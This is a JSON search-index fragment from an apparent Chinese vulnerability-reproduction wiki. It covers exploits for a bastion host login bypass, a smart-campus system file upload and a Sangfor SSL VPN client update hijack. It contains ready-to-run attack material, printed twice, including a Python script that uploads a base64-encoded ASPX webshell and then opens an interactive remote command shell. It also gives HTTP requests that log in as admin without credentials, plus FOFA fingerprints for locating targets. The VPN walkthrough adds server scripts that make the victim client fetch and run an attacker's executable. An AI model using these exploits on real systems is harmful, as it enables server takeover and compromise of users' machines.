\u601d\u798f\u8fea\u5821\u5792\u673a","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] \"Logbase\u8fd0\u7ef4\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA/%E6%80%9D%E7%A6%8F%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u83b7\u53d6INFO\u5b57\u6bb5\uff0cu1\u53c2\u6570\u503c\u4e3a\u2f64\u6237\u540d POST /bhost/set_session HTTP/1.1 Host: xxx.xxx.xxx.xx u1=admin&m1= \u83b7\u5f97\uff1a {\"result\":true,\"info\":\"1562205376847\",\"ErrMsg\":\"\"} \u5e26\u2f0aINFO\u5b57\u6bb5\u8fdb\u2f0a\u5982\u4e0b\u8bf7\u6c42\u7684 a0 \u53c2\u6570\u503c\u4e2d,uCode\u53c2\u6570\u503c\u4e3a\u2f64\u6237\u540d POST /bhost/login_link HTTP/1.1 Host: xxx.xxx.xxx.xxx a0=1562205376847&a1=&a10=2019-01- 01+10:10:10&ha=CADFDF26E649FB6284D2FD424BD294B6&uCode=admin&vdcode= \u5229\u7528\u540e\u5373\u53ef\u767b\u5f55\u540e\u53f0","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"\u667a\u6167\u6821\u56ed\u7ba1\u7406\u7cfb\u7edf \u524d\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u667a\u6167\u6821\u56ed\u7ba1\u7406\u7cfb\u7edf\u524d\u53f0\u6ce8\u518c\u9875\u9762\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\uff0c\u7531\u4e8e\u6ca1\u6709\u5bf9\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u5ba1\u67e5\u5bfc\u81f4\u53ef\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\u63a7\u5236\u670d\u52a1\u5668 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u667a\u6167\u6821\u56ed\u7ba1\u7406\u7cfb\u7edf FOFA \u00b6 [!NOTE] body=\"DC_Login/QYSignUp\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b\uff0c\u53ea\u8981\u5b58\u5728\u4f01\u4e1a\u7528\u6237\u6ce8\u518c\u5c31\u53ef\u80fd\u51fa\u73b0\u6f0f\u6d1e [!NOTE] \u8fd9\u4e2a\u5730\u65b9\u7684\u4e0a\u4f20\u9644\u4ef6\u5141\u8bb8\u4e86\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff0c\u5305\u62ec aspx\u6728\u9a6c\uff0c\u4e0a\u4f20\u540e\u8fd8\u4f1a\u8fd4\u56de webshell\u5730\u5740 \u4e0a\u4f20\u7684\u662f\u51b0\u874e\u6728\u9a6c\uff0c\u76f4\u63a5\u8fde\u63a5 \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u667a\u6167\u6821\u56ed\u7ba1\u7406\u7cfb\u7edf \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/DC_OA_WJG/Upload\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"multipart/form-data; boundary=----WebKitFormBoundaryNxqOHxbHqt9mf7s5\" , } data = base64 . b64decode ( \"LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5TnhxT0h4YkhxdDltZjdzNQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVwRmlsZSI7IGZpbGVuYW1lPSJQZWlRaS5hc3B4IgpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQoKPHNjcmlwdCBsYW5ndWFnZT0iSlNjcmlwdCIgcnVuYXQ9InNlcnZlciI+ZnVuY3Rpb24gUGFnZV9Mb2FkKCl7ZXZhbChSZXF1ZXN0WyJQZWlRaSJdLCJ1bnNhZmUiKTt9PC9zY3JpcHQ+CgotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlOeHFPSHhiSHF0OW1mN3M1LS0=\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /DC_OA_WJG/Upload \u5c1d\u8bd5\u4e0a\u4f20\u6728\u9a6c..... \\033 [0m\" . format ( target_url )) if 'true' in response . text and 'path' in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20 Webshell\u6587\u4ef6 \\033 [0m\" . format ( target_url )) webshell_path = re . findall ( r '\"path\":\"(.*?)\"' , response . text )[ 0 ] print ( \" \\033 [32m[o] Webshell\u6587\u4ef6\u5730\u5740: {} / {} \\033 [0m\" . format ( target_url , webshell_path )) while True : Cmd = str ( input ( \" \\033 [35mCmd >>> \\033 [0m\" )) cmd_url = target_url + \"/\" + webshell_path + \"?PeiQi=Response.Write(new%20ActiveXObject(%22WSCRIPT.Shell%22).exec( %22c md%20/c%20 {} %22).StdOut.ReadAll());\" . format ( Cmd ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = cmd_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20Webshell\u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u667a\u6167\u6821\u56ed\u7ba1\u7406\u7cfb\u7edf \u524d\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u667a\u6167\u6821\u56ed\u7ba1\u7406\u7cfb\u7edf-\u524d\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":"","title":"\u667a\u6167\u6821\u56ed\u7ba1\u7406\u7cfb\u7edf \u524d\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u667a\u6167\u6821\u56ed\u7ba1\u7406\u7cfb\u7edf\u524d\u53f0\u6ce8\u518c\u9875\u9762\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\uff0c\u7531\u4e8e\u6ca1\u6709\u5bf9\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u5ba1\u67e5\u5bfc\u81f4\u53ef\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\u63a7\u5236\u670d\u52a1\u5668","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u667a\u6167\u6821\u56ed\u7ba1\u7406\u7cfb\u7edf","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] body=\"DC_Login/QYSignUp\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b\uff0c\u53ea\u8981\u5b58\u5728\u4f01\u4e1a\u7528\u6237\u6ce8\u518c\u5c31\u53ef\u80fd\u51fa\u73b0\u6f0f\u6d1e [!NOTE] \u8fd9\u4e2a\u5730\u65b9\u7684\u4e0a\u4f20\u9644\u4ef6\u5141\u8bb8\u4e86\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff0c\u5305\u62ec aspx\u6728\u9a6c\uff0c\u4e0a\u4f20\u540e\u8fd8\u4f1a\u8fd4\u56de webshell\u5730\u5740 \u4e0a\u4f20\u7684\u662f\u51b0\u874e\u6728\u9a6c\uff0c\u76f4\u63a5\u8fde\u63a5","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u667a\u6167\u6821\u56ed\u7ba1\u7406\u7cfb\u7edf \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/DC_OA_WJG/Upload\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"multipart/form-data; boundary=----WebKitFormBoundaryNxqOHxbHqt9mf7s5\" , } data = base64 . b64decode ( \"LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5TnhxT0h4YkhxdDltZjdzNQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVwRmlsZSI7IGZpbGVuYW1lPSJQZWlRaS5hc3B4IgpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQoKPHNjcmlwdCBsYW5ndWFnZT0iSlNjcmlwdCIgcnVuYXQ9InNlcnZlciI+ZnVuY3Rpb24gUGFnZV9Mb2FkKCl7ZXZhbChSZXF1ZXN0WyJQZWlRaSJdLCJ1bnNhZmUiKTt9PC9zY3JpcHQ+CgotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlOeHFPSHhiSHF0OW1mN3M1LS0=\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /DC_OA_WJG/Upload \u5c1d\u8bd5\u4e0a\u4f20\u6728\u9a6c..... \\033 [0m\" . format ( target_url )) if 'true' in response . text and 'path' in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20 Webshell\u6587\u4ef6 \\033 [0m\" . format ( target_url )) webshell_path = re . findall ( r '\"path\":\"(.*?)\"' , response . text )[ 0 ] print ( \" \\033 [32m[o] Webshell\u6587\u4ef6\u5730\u5740: {} / {} \\033 [0m\" . format ( target_url , webshell_path )) while True : Cmd = str ( input ( \" \\033 [35mCmd >>> \\033 [0m\" )) cmd_url = target_url + \"/\" + webshell_path + \"?PeiQi=Response.Write(new%20ActiveXObject(%22WSCRIPT.Shell%22).exec( %22c md%20/c%20 {} %22).StdOut.ReadAll());\" . format ( Cmd ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = cmd_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20Webshell\u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/","text":"\u6df1\u4fe1\u670d SSL VPN \u5ba2\u6237\u7aef\u8fdc\u7a0b\u6587\u4ef6\u4e0b\u8f7d \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6df1\u4fe1\u670d SSL VPN \u5ba2\u6237\u7aef\u5b58\u5728\u8fdc\u7a0b\u6587\u4ef6\u4e0b\u8f7d\uff0c\u4e14\u6587\u4ef6\u53ef\u63a7\u4e0b\u8f7d\u540e\u53ef\u6267\u884c \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u6df1\u4fe1\u670d SSL VPN \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767e\u5ea6\"intitle: \u6b22\u8fce\u4f7f\u7528SSL VPN\"\uff0c\u968f\u4fbf\u627e\u4e00\u4e2a\u5730\u65b9\u4e0b\u8f7dVPN\u5ba2\u6237\u7aef\u4e0b\u8f7d\u5b89\u88c5\uff1a \u5b89\u88c5\u5b8c\u4e4b\u540e\u8bbf\u95eeVPN\u7684\u9875\u9762\uff0c\u53d1\u73b0VPN\u4f1a\u81ea\u52a8\u4e0b\u8f7d\u7ec4\u4ef6\u66f4\u65b0\uff1a \u8fd9\u4e9b\u8bf7\u6c42\u5747\u4e3aGET\u8bf7\u6c42\u5e76\u9644\u5e26\u7740\u4e00\u4e9b\u53c2\u6570\uff0c\u6211\u4eec\u628a\u5b83\u4e00\u4e00\u5217\u4e0b\u6765\uff1a \u672c\u5730\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a 54530 \u7aef\u53e3\u5bf9\u5e94\u7684\u8fdb\u7a0b\u662f\u4ec0\u4e48\uff1a \u53d1\u73b0\u8fd9\u4e2a\u7aef\u53e3\u662fECAgent.exe\u5f00\u542f\u7684\uff0c\u5bfb\u627e\u5230\u5bf9\u5e94\u8fdb\u7a0b\u6587\u4ef6\u6240\u5728\u4f4d\u7f6e\uff1a \u786e\u8ba4\u8fd9\u662fXXX SSLVPN\u7684\u7a0b\u5e8f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5c06\u4e24\u8005\u8054\u7cfb\u5230\u4e00\u8d77\uff0c\u8bbf\u95eeVPN\u767b\u5f55\u9996\u9875\u4f1a\u89e6\u53d1\u5bf9 127.0.0.1 \u7684\u8bbf\u95ee\u4ece\u800c\u5f15\u8d77VPN\u8fdb\u884c\u7ec4\u4ef6\u66f4\u65b0\u3002 \u901a\u8fc7\u4ee5\u4e0a\u7684\u5206\u6790\u6211\u4eec\u731c\u6d4b\u4e86\u6574\u4e2a\u5927\u81f4\u6d41\u7a0b\uff0c\u4f46\u6211\u4eec\u8bbe\u60f3\u4e00\u4e0b\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u672c\u5730\u7684\u66f4\u65b0\u6307\u5411\u6211\u4eec\u7684\u670d\u52a1\u5668\uff0c\u7136\u540e\u5c06\u66f4\u65b0\u7684\u7ec4\u4ef6\u5185\u5bb9\u66ff\u6362\u6210\u6076\u610f\u7a0b\u5e8f\uff0c\u5f53\u7a0b\u5e8f\u542f\u52a8\u7684\u65f6\u5019\u5c31\u542f\u52a8\u4e86\u6076\u610f\u7a0b\u5e8f\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u62ff\u5230\u5b89\u88c5VPN\u5ba2\u6237\u7aef\u7684\u4f7f\u7528\u8005PC\u6743\u9650\u3002 \u518d\u56de\u5230\u4e4b\u524d\u7684\u672c\u5730\u94fe\u63a5\u5217\u8868\uff0c\u6839\u636e\u5bf9\u82f1\u6587\u7684\u7406\u89e3\uff0c\u53c2\u6570op\u7684\u503c\u5e94\u8be5\u4e3a\u5176\u5177\u4f53\u5bf9\u5e94\u8981\u6267\u884c\u7684\u52a8\u4f5c\uff1a InitECAgent -> \u521d\u59cb\u5316 GetEncryptKey -> \u83b7\u53d6\u52a0\u5bc6\u5bc6\u94a5 DoConfigure -> \u914d\u7f6e CheckReLogin -> \u68c0\u67e5\u91cd\u65b0\u767b\u5f55 CheckProxySetting -> \u68c0\u67e5\u4ee3\u7406\u8bbe\u7f6e UpdateControls -> \u66f4\u65b0\u63a7\u5236 DoQueryService -> \u67e5\u8be2\u670d\u52a1 \u7b2c\u4e00\u4e2a\u521d\u59cb\u5316\u7684\u8bf7\u6c42\u5b58\u5728\u53ef\u63a7\u53c2\u6570arg1\uff1a https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=vpn.xxx.edu.cn%20443&callback=EA_cb10000 \u53c2\u6570 arg1=vpn.xxx.edu.cn%20443 \uff0c\u5bf9\u5e94\u503c\u4e5f\u5c31\u662fHOST+\u7a7a\u683c+\u7aef\u53e3\u7684\u683c\u5f0f\uff0c\u770b\u5230\u8fd9\u91cc\u57fa\u672c\u4e0a\u5c31\u4f1a\u6709\u4e00\u4e2a\u601d\u8def\uff0c\u5ba2\u6237\u7aef\u66f4\u65b0\u63a7\u4ef6\u662f\u4e0d\u662f\u6839\u636e\u8fd9\u4e2a\u6307\u5b9a\u503c\u5411\u5176\u53d1\u9001\u8bf7\u6c42\u66f4\u65b0\u7684\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u53ea\u66ff\u6362\u7b2c\u4e00\u4e2a\u521d\u59cb\u5316\u8bf7\u6c42\u7684arg1\u53c2\u6570\u4e3a 172.20.10.2 8000 \uff0c\u7136\u540e\u672c\u5730\u642d\u5efa\u4e00\u4e2aHTTP\u670d\u52a1\uff1a python -m SimpleHTTPServer \u5176\u4ed6\u7684\u8bf7\u6c42\u539f\u5c01\u4e0d\u52a8\uff0c\u4f9d\u6b21\u8bf7\u6c42\u4e00\u904d\u90a3\u4e00\u4efdURL \u670d\u52a1\u7aef\u6210\u529f\u6536\u5230\u8bf7\u6c42\uff0c\u4f46\u662f\u5374\u51fa\u73b0\u4e86\u9519\u8bef\u7684\u63d0\u793a\uff1a \u9996\u5148\u6211\u4eec\u5df2\u7ecf\u9a8c\u8bc1\u4e86\u81ea\u5df1\u7684\u731c\u60f3\uff0c\u66f4\u65b0\u5730\u5740\u662f\u81ea\u5df1\u53ef\u63a7\u7684\uff0c\u5ba2\u6237\u7aef\u786e\u5b9e\u4f1a\u5411\u6211\u4eec\u6307\u5b9a\u7684\u670d\u52a1\u7aef\u53d1\u9001\u8bf7\u6c42\uff0c\u4f46\u7531\u4e8e\u51fa\u73b0\u4e86\u9519\u8bef\u6211\u4eec\u4e0d\u77e5\u9053\u5ba2\u6237\u7aef\u8bbf\u95ee\u4e86\u54ea\u4e2a\u6587\u4ef6\uff0c\u4e5f\u4e0d\u77e5\u9053\u8bbf\u95ee\u6587\u4ef6\u4e4b\u540e\u505a\u4e86\u4ec0\u4e48\u52a8\u4f5c\u3002 \u73b0\u5728\u8981\u505a\u7684\u5c31\u662f\u642d\u5efa\u4e00\u4e2a\u5ba2\u6237\u7aef\u53ef\u4ee5\u6b63\u5e38\u8bbf\u95ee\u7684\u8bf7\u6c42\uff0c\u901a\u8fc7\u8fd9\u4e2a\u9519\u8bef\u5927\u81f4\u53ef\u4ee5\u77e5\u9053\uff0c\u6211\u642d\u5efa\u7684\u670d\u52a1\u7aef\u534f\u8bae\u548c\u5ba2\u6237\u7aef\u8bf7\u6c42\u4f7f\u7528\u7684\u534f\u8bae\u4e0d\u4e00\u81f4\uff0c\u672c\u673a\u6293\u4e2a\u5305\u53d1\u73b0\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u662f HTTPS \u534f\u8bae\uff0c\u8fd9\u5c31\u9700\u8981\u642d\u5efa\u4e00\u4e2a HTTPS \u670d\u52a1\u4e86\u3002 \u5982\u4e0b\u811a\u672c\u57fa\u4e8ePython\u5e93\u5efa\u7acb\u4e00\u4e2a HTTPS \u670d\u52a1\uff1a # openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes import BaseHTTPServer , SimpleHTTPServer import ssl httpd = BaseHTTPServer . HTTPServer (( '0.0.0.0' , 8000 ), SimpleHTTPServer . SimpleHTTPRequestHandler ) httpd . socket = ssl . wrap_socket ( httpd . socket , certfile = './server.pem' , server_side = True ) httpd . serve_forever () \u642d\u5efa\u8d77\u4e00\u4e2a HTTPS \u73af\u5883\u540e\u518d\u6b21\u590d\u73b0\u5982\u4e0a\u8bf7\u6c42\uff0c\u670d\u52a1\u7aef\u6536\u5230\u65e5\u5fd7\uff1a \u53ef\u4ee5\u770b\u89c1\u5ba2\u6237\u7aef\u4f1a\u8bbf\u95ee\u4e24\u4e2a\u6587\u4ef6\uff1a /com/WindowsModule.xml /com/win/XXXUD.exe \u5148\u4e0d\u7ba1xml\u6587\u4ef6\u662f\u600e\u4e48\u6837\u7684\uff0c\u53ef\u6267\u884c\u6587\u4ef6(exe)\u662f\u9700\u8981\u91cd\u89c6\u7684\uff0c\u4f46\u662f\u8fd9\u91cc\u901a\u8fc7\u63d0\u793a\u53ef\u4ee5\u770b\u51fa\u5ba2\u6237\u7aef\u53d1\u51fa\u7684\u8bf7\u6c42\u662fPOST\u8bf7\u6c42\uff0c\u4f46\u6211\u4eec\u6240\u5199\u7684Python\u811a\u672c\u5efa\u7acb\u7684HTTPS\u670d\u52a1\u5e76\u4e0d\u652f\u6301POST\u65b9\u6cd5\uff0c\u6211\u4eec\u9700\u8981\u91cd\u5199\u4e00\u4e0bHandler\uff1a import BaseHTTPServer import SimpleHTTPServer import cgi import ssl class ServerHandler ( SimpleHTTPServer . SimpleHTTPRequestHandler ): def do_POST ( self ): form = cgi . FieldStorage () SimpleHTTPServer . SimpleHTTPRequestHandler . do_GET ( self ) Handler = ServerHandler httpd = BaseHTTPServer . HTTPServer (( '0.0.0.0' , 8000 ), Handler ) httpd . socket = ssl . wrap_socket ( httpd . socket , certfile = './server.pem' , server_side = True ) httpd . serve_forever () \u6700\u7ec8\u5982\u4e0a\u811a\u672c\u652f\u6301 POST \u65b9\u6cd5\uff0c\u5f53\u65f6\u7528 POST \u65b9\u6cd5\u8bf7\u6c42\u65f6\u5373\u8fd4\u56de\u6587\u4ef6\u5185\u5bb9\u3002 \u6700\u540e\uff0c\u62d6\u4e00\u4e2a calc.exe \uff08\u8ba1\u7b97\u5668\uff09\u5230HTTPS\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u7684 /com/win/XXXUD.exe \u3002 \u4f9d\u6b21\u8bf7\u6c42\uff08 \u7ecf\u8fc7\u591a\u6b21\u590d\u73b0\u53d1\u73b0\uff0c\u8fd9\u4e09\u4e2a\u8bf7\u6c42\u624d\u662f\u91cd\u70b9\u7684\uff0c\u5176\u4ed6\u7684\u53ef\u4ee5\u5ffd\u7565 \uff09\uff1a https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=172.20.10.2 8000&callback=EA_cb10000 https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&arg1=3408a894633162c62188f98e92a221967dccfa5aafbd79b576714b4d1c392a4ad4b220d698efcd939c3b1b37467023e9380ee3abf0e492ee2efc736de757b80e973fe4c7d8af1af211a3f7ff3433cd9de975c76583efe7251dd1c0656f4384832998630359b65beb131cd8d287712462fa1b9e9acbc96dcc678b84cd57178c1a&token=50065256e83ff1bb9e01757d0d22b669&callback=EA_cb10003 https://127.0.0.1:54530/ECAgent/?op=UpdateControls&arg1=BEFORELOGIN&callback=EA_cb10005 